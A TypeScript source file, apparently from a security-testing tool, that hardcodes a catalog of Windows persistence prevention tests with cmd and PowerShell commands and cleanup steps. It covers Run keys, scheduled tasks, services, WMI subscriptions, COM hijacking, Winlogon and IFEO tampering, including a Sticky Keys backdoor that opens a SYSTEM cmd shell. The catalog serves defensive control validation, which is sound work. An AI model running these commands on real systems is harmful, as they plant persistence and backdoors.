/**
 * Persistence-Info ingestor — Windows persistence mechanism prevention tests.
 * Ported from magicsword-io/Magic-Atomics backend/app/ingestion/persistence_info.py.
 *
 * Based on the persistence-info project
 * (https://github.com/persistence-info/persistence-info.github.io). The data is
 * fully hardcoded — there is no repository to fetch — so collect() builds every
 * prevention test directly from the embedded catalog. Each test attempts to
 * create a persistence entry (safely, with benign payloads such as calc.exe),
 * verifies whether it was ALLOWED or BLOCKED, and ships a matching cleanup
 * command. Platform: Windows only.
 */

import type { LotlIngestor } from "../base";
import type { NormalizedEntry, LotlExecutor, LotlRisk } from "../types";

interface PVariant {
  variantName: string;
  executor: LotlExecutor;
  elevation: boolean;
  riskLevel: LotlRisk;
  command: string;
  cleanup: string;
  description: string;
}

interface PMechanism {
  id: string;
  name: string;
  description: string;
  techniqueId: string;
  techniqueIds: string[];
  reference: string;
  variants: PVariant[];
}

const PERSISTENCE_CATALOG: PMechanism[] = [
  {
    id: String.raw`reg-run-hkcu`,
    name: String.raw`Registry Run Key (HKCU)`,
    description: String.raw`Adds a value to HKCU\Software\Microsoft\Windows\CurrentVersion\Run so that a program executes every time the current user logs on. This is one of the most common persistence mechanisms used by malware and adversaries because it requires no elevation.`,
    techniqueId: String.raw`T1547.001`,
    techniqueIds: [String.raw`T1547.001`, String.raw`T1112`],
    reference: String.raw`https://persistence-info.github.io/Data/run.html`,
    variants: [
      {
        variantName: String.raw`reg.exe add`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MagicAtomicsPersistTest /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MagicAtomicsPersistTest >nul 2>&1 && (echo ALLOWED: HKCU Run key created successfully) || (echo BLOCKED: HKCU Run key creation was prevented)`,
        cleanup: String.raw`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MagicAtomicsPersistTest /f 2>nul`,
        description: String.raw`Uses reg.exe to add a Run key under HKCU for the current user. Security controls should detect or block unauthorized Run key modifications.`,
      },
      {
        variantName: String.raw`PowerShell Set-ItemProperty`,
        executor: "powershell",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`powershell.exe -NoProfile -Command "$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; try { Set-ItemProperty -Path $regPath -Name 'MagicAtomicsPersistTestPS' -Value 'C:\Windows\System32\calc.exe' -ErrorAction Stop; $val = Get-ItemProperty -Path $regPath -Name 'MagicAtomicsPersistTestPS' -ErrorAction Stop; if ($val) { Write-Host 'ALLOWED: HKCU Run key created via PowerShell' } } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MagicAtomicsPersistTestPS' -Force -ErrorAction SilentlyContinue"`,
        description: String.raw`Uses PowerShell Set-ItemProperty to create a Run key under HKCU. Tests whether PowerShell-based registry modification is monitored or blocked.`,
      },
    ],
  },
  {
    id: String.raw`reg-run-hklm`,
    name: String.raw`Registry Run Key (HKLM)`,
    description: String.raw`Adds a value to HKLM\Software\Microsoft\Windows\CurrentVersion\Run so that a program executes for ALL users at logon. Requires administrator privileges. Machine-wide persistence is higher impact than per-user.`,
    techniqueId: String.raw`T1547.001`,
    techniqueIds: [String.raw`T1547.001`, String.raw`T1112`],
    reference: String.raw`https://persistence-info.github.io/Data/run.html`,
    variants: [
      {
        variantName: String.raw`reg.exe add (HKLM)`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MagicAtomicsPersistTest /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MagicAtomicsPersistTest >nul 2>&1 && (echo ALLOWED: HKLM Run key created successfully) || (echo BLOCKED: HKLM Run key creation was prevented)`,
        cleanup: String.raw`reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MagicAtomicsPersistTest /f 2>nul`,
        description: String.raw`Uses reg.exe to add a machine-wide Run key under HKLM. Requires admin. Tests whether elevated registry persistence is blocked.`,
      },
    ],
  },
  {
    id: String.raw`reg-runonce`,
    name: String.raw`Registry RunOnce Key`,
    description: String.raw`Adds a value to HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce which executes once at the next logon and then auto-deletes. Commonly used by malware for one-shot execution that leaves fewer forensic artifacts.`,
    techniqueId: String.raw`T1547.001`,
    techniqueIds: [String.raw`T1547.001`, String.raw`T1112`],
    reference: String.raw`https://persistence-info.github.io/Data/runonce.html`,
    variants: [
      {
        variantName: String.raw`reg.exe add RunOnce`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MagicAtomicsPersistTest /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MagicAtomicsPersistTest >nul 2>&1 && (echo ALLOWED: RunOnce key created successfully) || (echo BLOCKED: RunOnce key creation was prevented)`,
        cleanup: String.raw`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MagicAtomicsPersistTest /f 2>nul`,
        description: String.raw`Creates a RunOnce registry entry that fires at next logon. Tests whether security controls monitor single-use persistence entries.`,
      },
    ],
  },
  {
    id: String.raw`schtask-persist`,
    name: String.raw`Scheduled Task Persistence`,
    description: String.raw`Creates a Windows Scheduled Task that runs at logon or on a schedule. Scheduled tasks are a favored persistence mechanism because they support complex triggers and can run as SYSTEM.`,
    techniqueId: String.raw`T1053.005`,
    techniqueIds: [String.raw`T1053.005`],
    reference: String.raw`https://persistence-info.github.io/Data/scheduledtasks.html`,
    variants: [
      {
        variantName: String.raw`schtasks /create (user context)`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`schtasks /create /tn "MagicAtomicsPersistTest" /tr "C:\Windows\System32\calc.exe" /sc onlogon /f && schtasks /query /tn "MagicAtomicsPersistTest" >nul 2>&1 && (echo ALLOWED: Scheduled task created successfully) || (echo BLOCKED: Scheduled task creation was prevented)`,
        cleanup: String.raw`schtasks /delete /tn "MagicAtomicsPersistTest" /f 2>nul`,
        description: String.raw`Uses schtasks.exe to create a task triggered at user logon. Tests whether task creation is blocked by application control or EDR.`,
      },
      {
        variantName: String.raw`schtasks /create (SYSTEM context)`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`schtasks /create /tn "MagicAtomicsPersistTestSys" /tr "C:\Windows\System32\calc.exe" /sc onstart /ru SYSTEM /f && schtasks /query /tn "MagicAtomicsPersistTestSys" >nul 2>&1 && (echo ALLOWED: SYSTEM scheduled task created successfully) || (echo BLOCKED: SYSTEM scheduled task creation was prevented)`,
        cleanup: String.raw`schtasks /delete /tn "MagicAtomicsPersistTestSys" /f 2>nul`,
        description: String.raw`Creates a scheduled task that runs as SYSTEM at boot. Requires elevation. Tests detection of high-privilege persistence.`,
      },
      {
        variantName: String.raw`PowerShell Register-ScheduledTask`,
        executor: "powershell",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`powershell.exe -NoProfile -Command "$action = New-ScheduledTaskAction -Execute 'calc.exe'; $trigger = New-ScheduledTaskTrigger -AtLogOn; try { Register-ScheduledTask -TaskName 'MagicAtomicsPersistTestPS' -Action $action -Trigger $trigger -ErrorAction Stop | Out-Null; Write-Host 'ALLOWED: Scheduled task created via PowerShell' } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Unregister-ScheduledTask -TaskName 'MagicAtomicsPersistTestPS' -Confirm:$false -ErrorAction SilentlyContinue"`,
        description: String.raw`Uses PowerShell Register-ScheduledTask cmdlet to create persistence. Tests whether PowerShell-based task scheduling is monitored.`,
      },
    ],
  },
  {
    id: String.raw`service-persist`,
    name: String.raw`Windows Service Persistence`,
    description: String.raw`Creates a new Windows service that starts automatically at boot. Services run in Session 0 and can run as SYSTEM, making them a powerful persistence mechanism.`,
    techniqueId: String.raw`T1543.003`,
    techniqueIds: [String.raw`T1543.003`],
    reference: String.raw`https://persistence-info.github.io/Data/services.html`,
    variants: [
      {
        variantName: String.raw`sc.exe create`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`sc create MagicAtomicsPersistTestSvc binPath= "C:\Windows\System32\calc.exe" start= auto && sc query MagicAtomicsPersistTestSvc >nul 2>&1 && (echo ALLOWED: Windows service created successfully) || (echo BLOCKED: Windows service creation was prevented)`,
        cleanup: String.raw`sc stop MagicAtomicsPersistTestSvc 2>nul & sc delete MagicAtomicsPersistTestSvc 2>nul`,
        description: String.raw`Uses sc.exe to create an auto-start service. Requires elevation. Tests whether unauthorized service installation is blocked.`,
      },
      {
        variantName: String.raw`PowerShell New-Service`,
        executor: "powershell",
        elevation: true,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "try { New-Service -Name 'MagicAtomicsPersistTestSvcPS' -BinaryPathName 'C:\Windows\System32\calc.exe' -DisplayName 'MagicAtomics Persistence Test' -StartupType Automatic -ErrorAction Stop | Out-Null; Write-Host 'ALLOWED: Windows service created via PowerShell' } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Stop-Service -Name 'MagicAtomicsPersistTestSvcPS' -Force -ErrorAction SilentlyContinue; sc.exe delete MagicAtomicsPersistTestSvcPS 2>$null"`,
        description: String.raw`Uses PowerShell New-Service to install a persistent service. Tests whether the PowerShell service creation path is monitored.`,
      },
    ],
  },
  {
    id: String.raw`wmi-event-subscription`,
    name: String.raw`WMI Event Subscription`,
    description: String.raw`Creates a permanent WMI event subscription (filter + consumer + binding) that triggers a command when a system event occurs. WMI subscriptions survive reboots and are notoriously difficult to detect without dedicated WMI monitoring.`,
    techniqueId: String.raw`T1546.003`,
    techniqueIds: [String.raw`T1546.003`],
    reference: String.raw`https://persistence-info.github.io/Data/wmieventsubscription.html`,
    variants: [
      {
        variantName: String.raw`PowerShell WMI Event Subscription`,
        executor: "powershell",
        elevation: true,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "$filterName = 'MagicAtomicsPersistFilter'; $consumerName = 'MagicAtomicsPersistConsumer'; try { $filter = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{ Name = $filterName; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\" AND TargetInstance.SystemUpTime >= 120' } -ErrorAction Stop; $consumer = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{ Name = $consumerName; CommandLineTemplate = 'cmd.exe /c echo MagicAtomics_WMI_Test > %TEMP%\\wmi_persist_test.txt' } -ErrorAction Stop; $null = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{ Filter = $filter; Consumer = $consumer } -ErrorAction Stop; Write-Host 'ALLOWED: WMI event subscription created successfully' } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' | Where-Object { $_.Filter -like '*MagicAtomicsPersistFilter*' } | Remove-WmiObject -ErrorAction SilentlyContinue; Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' | Where-Object { $_.Name -eq 'MagicAtomicsPersistConsumer' } | Remove-WmiObject -ErrorAction SilentlyContinue; Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' | Where-Object { $_.Name -eq 'MagicAtomicsPersistFilter' } | Remove-WmiObject -ErrorAction SilentlyContinue; Remove-Item -Path $env:TEMP\\wmi_persist_test.txt -Force -ErrorAction SilentlyContinue"`,
        description: String.raw`Creates a full WMI event subscription chain (filter, consumer, binding) using PowerShell. This is a fileless persistence method that survives reboots.`,
      },
    ],
  },
  {
    id: String.raw`startup-folder`,
    name: String.raw`Startup Folder`,
    description: String.raw`Places a file or shortcut in the user's Startup folder (shell:startup) so it executes at logon. Simple but effective persistence that requires no registry changes.`,
    techniqueId: String.raw`T1547.001`,
    techniqueIds: [String.raw`T1547.001`],
    reference: String.raw`https://persistence-info.github.io/Data/startupfolder.html`,
    variants: [
      {
        variantName: String.raw`Copy to Startup folder (user)`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" && echo echo MagicAtomics Persistence Test >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" && if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" (echo ALLOWED: Startup folder persistence created) else (echo BLOCKED: Startup folder write was prevented)`,
        cleanup: String.raw`del /f "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" 2>nul`,
        description: String.raw`Drops a batch file into the current user's Startup folder. Tests whether file creation in Startup directories is monitored.`,
      },
      {
        variantName: String.raw`Copy to Startup folder (all users)`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`echo @echo off > "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" && echo echo MagicAtomics Persistence Test >> "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" && if exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" (echo ALLOWED: All-users Startup folder persistence created) else (echo BLOCKED: All-users Startup folder write was prevented)`,
        cleanup: String.raw`del /f "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\MagicAtomicsPersistTest.bat" 2>nul`,
        description: String.raw`Drops a batch file into the common (all users) Startup folder. Requires elevation. Tests machine-wide startup persistence.`,
      },
    ],
  },
  {
    id: String.raw`dll-search-order-hijack`,
    name: String.raw`DLL Search Order Hijacking`,
    description: String.raw`Plants a malicious DLL in a location that gets loaded before the legitimate one due to the Windows DLL search order. Targets writable directories that appear earlier in the search path than System32.`,
    techniqueId: String.raw`T1574.001`,
    techniqueIds: [String.raw`T1574.001`],
    reference: String.raw`https://persistence-info.github.io/Data/dllsearchorderhijacking.html`,
    variants: [
      {
        variantName: String.raw`DLL drop in application directory`,
        executor: "powershell",
        elevation: false,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "$testDir = Join-Path $env:TEMP 'MagicAtomicsDLLTest'; New-Item -ItemType Directory -Path $testDir -Force | Out-Null; $dllPath = Join-Path $testDir 'version.dll'; try { [System.IO.File]::WriteAllText($dllPath, 'MagicAtomics DLL hijack test placeholder'); if (Test-Path $dllPath) { Write-Host 'ALLOWED: DLL written to' $dllPath '- search order hijack possible' } else { Write-Host 'BLOCKED: DLL creation was prevented' } } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Remove-Item -Path (Join-Path $env:TEMP 'MagicAtomicsDLLTest') -Recurse -Force -ErrorAction SilentlyContinue"`,
        description: String.raw`Creates a test DLL (non-functional placeholder) in a temp directory to validate whether endpoint security detects DLL drop operations. Real attacks would use a compiled DLL targeting a specific application.`,
      },
    ],
  },
  {
    id: String.raw`com-object-hijack`,
    name: String.raw`COM Object Hijacking`,
    description: String.raw`Hijacks a COM object by creating or modifying a CLSID entry in HKCU\Software\Classes\CLSID to point to an attacker-controlled DLL or script. The HKCU hive takes precedence over HKLM, enabling user-level COM hijacking without elevation.`,
    techniqueId: String.raw`T1546.015`,
    techniqueIds: [String.raw`T1546.015`],
    reference: String.raw`https://persistence-info.github.io/Data/comhijacking.html`,
    variants: [
      {
        variantName: String.raw`HKCU CLSID InProcServer32 hijack`,
        executor: "cmd",
        elevation: false,
        riskLevel: "high",
        command: String.raw`reg add "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" >nul 2>&1 && (echo ALLOWED: COM object hijack CLSID entry created) || (echo BLOCKED: COM object hijack was prevented)`,
        cleanup: String.raw`reg delete "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" /f 2>nul`,
        description: String.raw`Hijacks a known COM CLSID by writing an InprocServer32 entry to HKCU. The CLSID {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} is commonly targeted. Tests detection of registry-based COM hijacking.`,
      },
      {
        variantName: String.raw`PowerShell COM hijack via ScriptletURL`,
        executor: "powershell",
        elevation: false,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "$clsid = '{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}'; $regPath = \"HKCU:\Software\Classes\CLSID\$clsid\InprocServer32\"; try { New-Item -Path $regPath -Force | Out-Null; Set-ItemProperty -Path $regPath -Name '(Default)' -Value 'C:\Windows\System32\scrobj.dll' -ErrorAction Stop; Set-ItemProperty -Path $regPath -Name 'ThreadingModel' -Value 'Both' -ErrorAction Stop; New-ItemProperty -Path $regPath -Name 'ScriptletURL' -Value 'https://example.com/test.sct' -PropertyType String -Force -ErrorAction Stop | Out-Null; Write-Host 'ALLOWED: COM hijack with ScriptletURL created' } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Remove-Item -Path 'HKCU:\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}' -Recurse -Force -ErrorAction SilentlyContinue"`,
        description: String.raw`Creates a COM hijack with ScriptletURL pointing to an SCT file (scrobj.dll as InprocServer32). Tests detection of scriptlet-based COM persistence.`,
      },
    ],
  },
  {
    id: String.raw`winlogon-helper`,
    name: String.raw`Winlogon Helper DLL`,
    description: String.raw`Modifies Winlogon registry keys (Shell, Userinit, Notify) to load a malicious DLL or executable during the Windows logon process. These keys are processed by winlogon.exe, which runs as SYSTEM.`,
    techniqueId: String.raw`T1547.004`,
    techniqueIds: [String.raw`T1547.004`],
    reference: String.raw`https://persistence-info.github.io/Data/winlogon.html`,
    variants: [
      {
        variantName: String.raw`Winlogon Shell modification`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, calc.exe" /f && reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell | findstr /i "calc.exe" >nul 2>&1 && (echo ALLOWED: Winlogon Shell key modified to include calc.exe) || (echo BLOCKED: Winlogon Shell modification was prevented)`,
        cleanup: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f 2>nul`,
        description: String.raw`Appends calc.exe to the Winlogon Shell value so it launches alongside explorer.exe at logon. Tests detection of Winlogon Shell tampering.`,
      },
      {
        variantName: String.raw`Winlogon Userinit modification`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\Windows\System32\calc.exe," /f && reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit | findstr /i "calc.exe" >nul 2>&1 && (echo ALLOWED: Winlogon Userinit modified to include calc.exe) || (echo BLOCKED: Winlogon Userinit modification was prevented)`,
        cleanup: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe," /f 2>nul`,
        description: String.raw`Appends calc.exe to the Winlogon Userinit value. Userinit.exe is executed by winlogon.exe after user authentication. Tests detection of Userinit tampering.`,
      },
    ],
  },
  {
    id: String.raw`appinit-dlls`,
    name: String.raw`AppInit DLLs`,
    description: String.raw`Configures the AppInit_DLLs registry value to inject a DLL into every process that loads user32.dll. This is a classic persistence and injection technique. Modern Windows versions require the DLL to be code-signed when Secure Boot is enabled.`,
    techniqueId: String.raw`T1546.010`,
    techniqueIds: [String.raw`T1546.010`],
    reference: String.raw`https://persistence-info.github.io/Data/appinitdlls.html`,
    variants: [
      {
        variantName: String.raw`AppInit_DLLs registry value`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\MagicAtomicsTest.dll" /f && reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f && reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs | findstr /i "MagicAtomicsTest" >nul 2>&1 && (echo ALLOWED: AppInit_DLLs registry value set) || (echo BLOCKED: AppInit_DLLs modification was prevented)`,
        cleanup: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "" /f 2>nul && reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f 2>nul`,
        description: String.raw`Sets AppInit_DLLs to a test path and enables LoadAppInit_DLLs. Tests whether the system allows DLL injection configuration changes. On Secure Boot systems, unsigned DLLs will be rejected at load time.`,
      },
    ],
  },
  {
    id: String.raw`ifeo-debugger`,
    name: String.raw`Image File Execution Options Debugger`,
    description: String.raw`Sets a Debugger value under an Image File Execution Options (IFEO) registry key so that launching the target executable actually launches the 'debugger' instead. Commonly used to hijack accessibility tools (sethc.exe, utilman.exe) for backdoor access at the lock screen.`,
    techniqueId: String.raw`T1546.012`,
    techniqueIds: [String.raw`T1546.012`],
    reference: String.raw`https://persistence-info.github.io/Data/ifeo.html`,
    variants: [
      {
        variantName: String.raw`IFEO debugger for notepad.exe`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger >nul 2>&1 && (echo ALLOWED: IFEO debugger set for notepad.exe) || (echo BLOCKED: IFEO debugger creation was prevented)`,
        cleanup: String.raw`reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /f 2>nul`,
        description: String.raw`Sets an IFEO Debugger for notepad.exe so launching Notepad actually launches calc.exe. Uses a benign target to test detection safely. Real attacks target sethc.exe/utilman.exe for lock-screen backdoors.`,
      },
      {
        variantName: String.raw`IFEO debugger for sethc.exe (Sticky Keys backdoor)`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f && reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger >nul 2>&1 && (echo ALLOWED: Sticky Keys backdoor IFEO set - sethc.exe will launch cmd.exe) || (echo BLOCKED: Sticky Keys IFEO backdoor was prevented)`,
        cleanup: String.raw`reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f 2>nul`,
        description: String.raw`Creates the classic Sticky Keys backdoor by setting an IFEO debugger for sethc.exe (Sticky Keys) to cmd.exe. This gives a SYSTEM shell at the Windows lock screen. A high-value detection for any security team.`,
      },
    ],
  },
  {
    id: String.raw`logon-script`,
    name: String.raw`Logon Script (UserInitMprLogonScript)`,
    description: String.raw`Sets the UserInitMprLogonScript environment variable in the registry to execute a script at user logon. This legacy mechanism is often overlooked by security tools but is well-documented in persistence research.`,
    techniqueId: String.raw`T1037.001`,
    techniqueIds: [String.raw`T1037.001`],
    reference: String.raw`https://persistence-info.github.io/Data/logonscript.html`,
    variants: [
      {
        variantName: String.raw`UserInitMprLogonScript registry`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKCU\Environment" /v UserInitMprLogonScript >nul 2>&1 && (echo ALLOWED: Logon script persistence set via UserInitMprLogonScript) || (echo BLOCKED: Logon script persistence was prevented)`,
        cleanup: String.raw`reg delete "HKCU\Environment" /v UserInitMprLogonScript /f 2>nul`,
        description: String.raw`Sets the UserInitMprLogonScript value in the HKCU Environment key. This causes the specified program to run at every user logon. Does not require elevation.`,
      },
    ],
  },
  {
    id: String.raw`screensaver-persist`,
    name: String.raw`Screensaver Persistence`,
    description: String.raw`Configures a malicious screensaver (.scr) by modifying registry keys under HKCU\Control Panel\Desktop. The screensaver binary runs when the screen locks, providing an unusual but effective persistence vector.`,
    techniqueId: String.raw`T1546.002`,
    techniqueIds: [String.raw`T1546.002`],
    reference: String.raw`https://persistence-info.github.io/Data/screensaver.html`,
    variants: [
      {
        variantName: String.raw`Screensaver registry modification`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f && reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE | findstr /i "calc.exe" >nul 2>&1 && (echo ALLOWED: Screensaver persistence set to calc.exe) || (echo BLOCKED: Screensaver modification was prevented)`,
        cleanup: String.raw`reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f 2>nul && reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 0 /f 2>nul`,
        description: String.raw`Sets the screensaver to calc.exe and enables it with a 60-second timeout. Tests whether screensaver-based persistence is detected.`,
      },
    ],
  },
  {
    id: String.raw`registry-load-hive`,
    name: String.raw`Registry Hive Load (reg load)`,
    description: String.raw`Uses reg.exe to load an offline registry hive, enabling offline modification of another user's or the system's registry. Adversaries use this to plant persistence in hives that aren't currently mounted.`,
    techniqueId: String.raw`T1112`,
    techniqueIds: [String.raw`T1112`],
    reference: String.raw`https://persistence-info.github.io/Data/registryhive.html`,
    variants: [
      {
        variantName: String.raw`Load offline registry hive`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg save HKCU\Software "%TEMP%\MagicAtomicsHiveTest.hiv" /y >nul 2>&1 && reg load HKLM\MagicAtomicsHiveTest "%TEMP%\MagicAtomicsHiveTest.hiv" && (echo ALLOWED: Registry hive loaded successfully to HKLM\MagicAtomicsHiveTest) || (echo BLOCKED: Registry hive load was prevented)`,
        cleanup: String.raw`reg unload HKLM\MagicAtomicsHiveTest 2>nul & del /f "%TEMP%\MagicAtomicsHiveTest.hiv" 2>nul`,
        description: String.raw`Saves the current user's Software hive to disk, then loads it under HKLM as a test. Detects whether offline hive manipulation is monitored.`,
      },
    ],
  },
  {
    id: String.raw`netsh-helper-dll`,
    name: String.raw`Netsh Helper DLL`,
    description: String.raw`Registers a DLL as a Netsh helper. Every time netsh.exe runs, it loads all registered helper DLLs, enabling persistent code execution through a legitimate system tool.`,
    techniqueId: String.raw`T1546.007`,
    techniqueIds: [String.raw`T1546.007`],
    reference: String.raw`https://persistence-info.github.io/Data/netshhelper.html`,
    variants: [
      {
        variantName: String.raw`Netsh add helper registry key`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\NetSh" /v MagicAtomicsTest /t REG_SZ /d "C:\Windows\Temp\MagicAtomicsHelper.dll" /f && reg query "HKLM\Software\Microsoft\NetSh" /v MagicAtomicsTest >nul 2>&1 && (echo ALLOWED: Netsh helper DLL registered in registry) || (echo BLOCKED: Netsh helper DLL registration was prevented)`,
        cleanup: String.raw`reg delete "HKLM\Software\Microsoft\NetSh" /v MagicAtomicsTest /f 2>nul`,
        description: String.raw`Registers a test DLL as a Netsh helper by adding a registry entry. The DLL does not need to exist for the registry test to succeed. Tests detection of Netsh persistence mechanism.`,
      },
    ],
  },
  {
    id: String.raw`print-monitor`,
    name: String.raw`Print Monitor Persistence`,
    description: String.raw`Registers a DLL as a Windows print monitor by adding a registry key under HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors. The DLL is loaded by the spoolsv.exe (Print Spooler) service, which runs as SYSTEM.`,
    techniqueId: String.raw`T1547.010`,
    techniqueIds: [String.raw`T1547.010`],
    reference: String.raw`https://persistence-info.github.io/Data/printmonitor.html`,
    variants: [
      {
        variantName: String.raw`Print Monitor registry key`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
